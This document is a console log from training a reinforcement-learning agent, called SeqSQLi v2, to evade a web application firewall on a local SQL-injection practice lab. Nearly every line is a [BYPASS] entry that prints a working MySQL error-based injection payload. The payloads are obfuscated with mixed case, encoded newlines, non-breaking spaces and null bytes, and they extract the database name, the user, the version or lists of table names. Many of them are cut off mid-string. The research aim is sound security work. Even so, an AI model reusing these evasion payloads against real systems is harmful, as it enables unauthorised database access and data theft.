/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
 Seed        : 3
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-46.00
  [BYPASS] Ep 10373 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10375 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aanD%0aEXP(~(SelEcT%0a*%0afrOM%0a(SelECT%0a((SElecT%0aJSON_ARRAYAGG(cONCaT(tABLE_schema,CHAR(46),TablE_name))%0afroM%0aINFoRMaTIon_SCheMA.TabLes%0
  [BYPASS] Ep 10377 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SelecT%0a*%0aFROm%0a(sELEcT%0a(user%a0()))a));%00
  Ep 10380 | SR=30% | Steps=11.8 | R=-18.04
  Ep 10390 | SR=0% | Steps=15.0 | R=-33.50
  [BYPASS] Ep 10392 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaNd%0aEXP(~(seLEct%0a*%0afrom%0a(SELECt%0a((SeLeCT%0aJSON_ARRAYAGG(CoNcAt(TABlE_schema,CHAR(46),taBLe_name))%0aFrOM%0aINfOrmATiOn_sCHEMa.TabLes%0
  [BYPASS] Ep 10394 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 10398 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(SelecT%0a*%0aFrOM%0a(sELect%0a(version%a0()))a));%00
  Ep 10400 | SR=30% | Steps=11.8 | R=-23.11
  [BYPASS] Ep 10403 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10408 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaND%0aEXP(~(SELEcT%0a*%0aFRom%0a(seLEcT%0a((selECT%0aJSON_ARRAYAGG(CoNcaT(taBLe_schema,CHAR(46),tabLe_name))%0aFrOM%0aInFORmATION_sChemA.taBlEs%0
  Ep 10410 | SR=20% | Steps=12.9 | R=-25.09
  [BYPASS] Ep 10411 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10415 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SELEct%0a*%0afroM%0a(sELeCT%0a(version%a0()))a));%00
  Ep 10420 | SR=20% | Steps=12.7 | R=-26.49
  [BYPASS] Ep 10425 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(seLeCT%0a*%0afroM%0a(sElECT%0a(DataBaSe%a0()))a));%00
  Ep 10430 | SR=10% | Steps=13.9 | R=-28.69
  [BYPASS] Ep 10432 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 10438 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 10440 | SR=20% | Steps=12.6 | R=-25.62
  [BYPASS] Ep 10442 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 10447 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10450 | SR=20% | Steps=12.6 | R=-25.84
  [BYPASS] Ep 10454 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(sELECT%0a*%0afROm%0a(SeLECt%0a(user%a0()))a));%00
  Ep 10460 | SR=10% | Steps=13.9 | R=-29.20
  [BYPASS] Ep 10470 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(sElEcT%0a*%0aFRoM%0a(SELEct%0a(datABaSe%a0()))a));%00
  Ep 10470 | SR=10% | Steps=13.9 | R=-29.05
  [BYPASS] Ep 10475 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(sELEct%0a*%0aFrom%0a(SeLEct%0a(DataBaSe%a0()))a));%00
  [BYPASS] Ep 10479 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnd%0aEXP(~(SelEcT%0a*%0aFRom%0a(sEleCt%0a((seLECt%0aJSON_ARRAYAGG(cOncAT(tABLE_schema,CHAR(46),TAblE_name))%0afrOM%0ainfOrMatioN_scHeMA.TaBlEs%0
  [BYPASS] Ep 10480 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SeLeCt%0a*%0aFROM%0a(SELeCT%0a(DAtABASE%a0()))a));%00
  Ep 10480 | SR=30% | Steps=11.9 | R=-21.26
  [BYPASS] Ep 10481 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(seLect%0a*%0aFrOm%0a(seLECt%0a(version%a0()))a));%00
  [BYPASS] Ep 10483 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aanD%0aEXP(~(sELECT%0a*%0aFroM%0a(selEct%0a((sELecT%0aJSON_ARRAYAGG(cOnCat(TABlE_schema,CHAR(46),TabLe_name))%0aFrOm%0aiNFORMATioN_ScHemA.tABlEs%0
  [BYPASS] Ep 10486 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(SeLEcT%0a*%0aFROM%0a(sELECt%0a(user%a0()))a));%00
  Ep 10490 | SR=30% | Steps=11.9 | R=-21.32
  [BYPASS] Ep 10491 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SelECT%0a*%0afrom%0a(SElEct%0a(version%a0()))a));%00
  [BYPASS] Ep 10493 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10495 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aANd%0aEXP(~(seleCt%0a*%0aFrOm%0a(SELect%0a((seLeCt%0aJSON_ARRAYAGG(concat(TABLE_schema,CHAR(46),TaBle_name))%0aFROM%0aiNFOrMAtIon_scHeMA.TaBLEs%0
  [BYPASS] Ep 10497 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sEleCt%0a*%0afrOm%0a(seLect%0a(version%a0()))a));%00
  [BYPASS] Ep 10498 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SElECT%0a*%0aFrom%0a(sELeCT%0a(user%a0()))a));%00
  Ep 10500 | SR=50% | Steps=9.6 | R=-13.88
  [BYPASS] Ep 10501 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 10507 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaND%0aEXP(~(sElECT%0a*%0aFrOm%0a(sElEct%0a((sELECT%0aJSON_ARRAYAGG(cOnCAT(tABlE_schema,CHAR(46),TABLe_name))%0aFRom%0ainfoRMATIOn_sCHEmA.tABLes%0
  [BYPASS] Ep 10508 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(SELECt%0a*%0aFroM%0a(selECT%0a(user%a0()))a));%00
  Ep 10510 | SR=30% | Steps=11.8 | R=-20.33
  [BYPASS] Ep 10511 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sElect%0a*%0afROM%0a(seLECt%0a(version%a0()))a));%00
  [BYPASS] Ep 10514 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(seLECt%0a*%0afrOM%0a(selECT%0a((sELect%0aCOncAt(CHAR(124),JSON_ARRAYAGG(TABLe_name),CHAR(124))%0afRoM%0aInFOrMatIon_schEmA.TaBLes%0aW
  Ep 10520 | SR=20% | Steps=13.1 | R=-25.86
  [BYPASS] Ep 10523 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10524 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aanD%0aEXP(~(SelEcT%0a*%0aFRoM%0a(SEleCT%0a((sElEct%0aJSON_ARRAYAGG(COnCAt(TaBle_schema,CHAR(46),taBlE_name))%0afrOm%0aInfORMAtIOn_ScHeMa.TaBLEs%0
  [BYPASS] Ep 10525 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10526 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 10528 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 10530 | SR=50% | Steps=9.3 | R=-13.40
  [BYPASS] Ep 10533 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aanD%0aEXP(~(sELECt%0a*%0aFROM%0a(SelEcT%0a((SeLect%0aJSON_ARRAYAGG(cOncat(tabLe_schema,CHAR(46),TaBle_name))%0aFroM%0aiNFORMatIOn_Schema.tAbles%0
  [BYPASS] Ep 10535 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10536 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SelEct%0a*%0afrOM%0a(SeLect%0a(version%a0()))a));%00
  Ep 10540 | SR=30% | Steps=11.8 | R=-22.67
  [BYPASS] Ep 10544 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(seLeCT%0a*%0afRoM%0a(seLEcT%0a((SeLEct%0aCOncAT(CHAR(124),JSON_ARRAYAGG(tablE_name),CHAR(124))%0afrOM%0ainForMAtiOn_scHEMA.tabLEs%0aw
  [BYPASS] Ep 10545 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 10550 | SR=20% | Steps=13.0 | R=-27.51
  [BYPASS] Ep 10552 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(seLecT%0a*%0aFROm%0a(sELECt%0a(version%a0()))a));%00
  Ep 10560 | SR=10% | Steps=13.9 | R=-30.59
  [BYPASS] Ep 10562 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sElEcT%0a*%0afRoM%0a(seLeCT%0a(version%a0()))a));%00
  [BYPASS] Ep 10570 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(SElEcT%0a*%0aFRoM%0a(seLECt%0a(user%a0()))a));%00
  Ep 10570 | SR=20% | Steps=12.8 | R=-25.14
  [BYPASS] Ep 10574 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(seLecT%0a*%0afrom%0a(sELecT%0a(user%a0()))a));%00
  [BYPASS] Ep 10576 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaNd%0aEXP(~(sElecT%0a*%0aFrOm%0a(seLeCT%0a((seleCt%0aJSON_ARRAYAGG(COncAT(TABLE_schema,CHAR(46),TaBLE_name))%0afRom%0aINfORmatIoN_SCHEma.TABles%0
  [BYPASS] Ep 10577 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(seleCT%0a*%0afrOm%0a(sELeCt%0a(version%a0()))a));%00
  [BYPASS] Ep 10579 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(seleCt%0a*%0aFROm%0a(SELect%0a(user%a0()))a));%00
  Ep 10580 | SR=40% | Steps=10.8 | R=-18.45
  [BYPASS] Ep 10581 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(selecT%0a*%0aFRom%0a(SElEcT%0a(version%a0()))a));%00
  [BYPASS] Ep 10585 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10587 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 10590 | SR=30% | Steps=11.5 | R=-22.17
  [BYPASS] Ep 10592 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sElEct%0a*%0afROm%0a(seLeCT%0a(DAtABaSE%a0()))a));%00
  [BYPASS] Ep 10594 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnD%0aEXP(~(seLecT%0a*%0aFrom%0a(seLEcT%0a((SELEcT%0aJSON_ARRAYAGG(ConCaT(tablE_schema,CHAR(46),TAbLE_name))%0aFRoM%0aInforMaTioN_SCHEma.tables%0
  [BYPASS] Ep 10595 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(sElEct%0a*%0aFrOM%0a(sELEct%0a(databasE%a0()))a));%00
  [BYPASS] Ep 10598 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 10600 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(seLecT%0a*%0afROm%0a(SELEct%0a(daTAbASE%a0()))a));%00
  Ep 10600 | SR=50% | Steps=9.6 | R=-14.07
  Ep 10610 | SR=0% | Steps=15.0 | R=-33.76
  [BYPASS] Ep 10612 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 10613 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10618 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SELecT%0a*%0aFRoM%0a(sELect%0a(user%a0()))a));%00
  Ep 10620 | SR=30% | Steps=11.5 | R=-20.04
  [BYPASS] Ep 10621 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(seleCT%0a*%0afrOM%0a(SeLEct%0a((SELect%0aCONCAt(CHAR(124),JSON_ARRAYAGG(TAble_name),CHAR(124))%0afRom%0aInFORmaTiOn_SChema.TAbles%0aW
  [BYPASS] Ep 10623 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaNd%0aEXP(~(SElect%0a*%0aFRom%0a(SeLect%0a((SELEct%0aJSON_ARRAYAGG(coNcAt(taBle_schema,CHAR(46),tabLe_name))%0aFrom%0aInfORMaTION_sChEMa.TABLes%0
  [BYPASS] Ep 10627 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SELeCT%0a*%0aFrom%0a(sElecT%0a((SelecT%0aCONcaT(CHAR(124),JSON_ARRAYAGG(taBle_name),CHAR(124))%0aFROm%0aINFORmATiOn_schEmA.tABles%0aW
  [BYPASS] Ep 10628 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 10630 | SR=40% | Steps=11.3 | R=-18.97
  Ep 10640 | SR=0% | Steps=15.0 | R=-30.87
  [BYPASS] Ep 10644 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10647 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10650 | SR=20% | Steps=12.6 | R=-25.58
  [BYPASS] Ep 10651 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(seLECt%0a*%0aFrom%0a(SelEct%0a(user%a0()))a));%00
  [BYPASS] Ep 10656 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(sELect%0a*%0afroM%0a(sElEcT%0a((selEcT%0aCoNcAt(CHAR(124),JSON_ARRAYAGG(tabLE_name),CHAR(124))%0aFROm%0aiNFOrmAtion_sChemA.taBlEs%0aW
  Ep 10660 | SR=20% | Steps=13.1 | R=-24.12
  [BYPASS] Ep 10662 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SeLecT%0a*%0afRom%0a(seLecT%0a((sELECt%0aconcaT(CHAR(124),JSON_ARRAYAGG(taBle_name),CHAR(124))%0afrOm%0ainFORMatIoN_ScheMA.TablEs%0aw
  [BYPASS] Ep 10666 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(sELEcT%0a*%0aFrOm%0a(sELECt%0a(user%a0()))a));%00
  Ep 10670 | SR=20% | Steps=13.1 | R=-25.78
  Ep 10680 | SR=0% | Steps=15.0 | R=-35.33
  [BYPASS] Ep 10686 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(SelEcT%0a*%0aFRom%0a(SeLeCt%0a(version%a0()))a));%00
  [BYPASS] Ep 10690 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10690 | SR=20% | Steps=12.8 | R=-26.31
  [BYPASS] Ep 10695 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SeLecT%0a*%0afRoM%0a(selECt%0a((sEleCt%0aconCaT(CHAR(124),JSON_ARRAYAGG(TAble_name),CHAR(124))%0aFrOM%0aINFormATIoN_schemA.tABlEs%0aW
  [BYPASS] Ep 10696 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaNd%0aEXP(~(selECT%0a*%0afroM%0a(SELEct%0a((SElecT%0aJSON_ARRAYAGG(coNcAT(TaBLe_schema,CHAR(46),tAbLE_name))%0afrom%0aiNfoRmatiOn_ScHEMA.tablEs%0
  Ep 10700 | SR=20% | Steps=13.3 | R=-25.87
  [BYPASS] Ep 10709 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 10710 | SR=10% | Steps=13.8 | R=-29.21
  [BYPASS] Ep 10712 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnD%0aEXP(~(SELEct%0a*%0afROM%0a(SeleCt%0a((sELEct%0aJSON_ARRAYAGG(ConcAt(tabLE_schema,CHAR(46),tAblE_name))%0aFROm%0aInForMation_ScHEmA.TaBLEs%0
  [BYPASS] Ep 10718 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(seleCT%0a*%0aFrom%0a(seLECT%0a(user%a0()))a));%00
  [BYPASS] Ep 10720 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SEleCt%0a*%0afRoM%0a(sElEct%0a(user%a0()))a));%00
  Ep 10720 | SR=30% | Steps=11.9 | R=-20.11
  [BYPASS] Ep 10721 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(seLecT%0a*%0afroM%0a(SeLECT%0a(DAtABaSe%a0()))a));%00
  [BYPASS] Ep 10725 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10728 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(SELeCt%0a*%0afroM%0a(SELecT%0a(version%a0()))a));%00
  [BYPASS] Ep 10730 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10730 | SR=40% | Steps=10.4 | R=-16.47
  [BYPASS] Ep 10731 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(sELect%0a*%0afroM%0a(SElecT%0a(version%a0()))a));%00
  [BYPASS] Ep 10738 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10740 | SR=20% | Steps=12.7 | R=-26.36
  [BYPASS] Ep 10742 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SeLECT%0a*%0afrOM%0a(SeLeCT%0a(version%a0()))a));%00
  [BYPASS] Ep 10743 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(SeLecT%0a*%0aFRoM%0a(selECT%0a((selEcT%0aCoNCaT(CHAR(124),JSON_ARRAYAGG(tABle_name),CHAR(124))%0afROM%0aInFoRMation_scHemA.TaBles%0aw
  [BYPASS] Ep 10748 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 10750 | SR=30% | Steps=11.9 | R=-22.34
  [BYPASS] Ep 10758 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(sELeCt%0a*%0aFROM%0a(SELeCt%0a(DatabASE%a0()))a));%00
  Ep 10760 | SR=10% | Steps=13.9 | R=-28.60
  [BYPASS] Ep 10768 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aANd%0aEXP(~(SelECT%0a*%0afrOM%0a(sElECt%0a((SeLeCT%0aJSON_ARRAYAGG(CoNCAT(tAbLe_schema,CHAR(46),taBlE_name))%0aFrOm%0ainformatioN_SCHemA.tAbles%0
  [BYPASS] Ep 10770 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(sELEcT%0a*%0afRoM%0a(sELeCT%0a(user%a0()))a));%00
  Ep 10770 | SR=20% | Steps=13.0 | R=-25.51
  [BYPASS] Ep 10772 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10777 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnd%0aEXP(~(SeLect%0a*%0afROM%0a(sELECT%0a((sELeCt%0aJSON_ARRAYAGG(CONcAT(tabLe_schema,CHAR(46),TaBle_name))%0aFROM%0aInFORMATIOn_schEMA.tABles%0
  [BYPASS] Ep 10778 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(sElECt%0a*%0afrOm%0a(SElECt%0a(user%a0()))a));%00
  Ep 10780 | SR=30% | Steps=11.8 | R=-22.83
  [BYPASS] Ep 10781 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(seleCt%0a*%0aFrom%0a(SElecT%0a(user%a0()))a));%00
  [BYPASS] Ep 10783 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aANd%0aEXP(~(SelecT%0a*%0afROm%0a(sELEct%0a((SelEcT%0aJSON_ARRAYAGG(conCat(tAble_schema,CHAR(46),tAblE_name))%0afrom%0aInForMaTIoN_SchEMA.TAbles%0
  Ep 10790 | SR=20% | Steps=13.0 | R=-23.70
  [BYPASS] Ep 10792 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnd%0aEXP(~(selEcT%0a*%0aFROM%0a(SelECt%0a((SeLECT%0aJSON_ARRAYAGG(CoNcAt(tABlE_schema,CHAR(46),tAbLE_name))%0aFrom%0aiNFoRmAtIoN_sCHEMA.TaBlEs%0
  Ep 10800 | SR=10% | Steps=14.1 | R=-30.93
  Ep 10810 | SR=0% | Steps=15.0 | R=-32.07
  [BYPASS] Ep 10812 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(sElect%0a*%0aFROM%0a(selEcT%0a(DATAbaSe%a0()))a));%00
  [BYPASS] Ep 10816 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10820 | SR=20% | Steps=12.7 | R=-25.01
  [BYPASS] Ep 10823 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 10830 | SR=10% | Steps=13.8 | R=-28.98
  [BYPASS] Ep 10832 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(sElECT%0a*%0afroM%0a(SelECT%0a(DATABASE%a0()))a));%00
  [BYPASS] Ep 10839 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
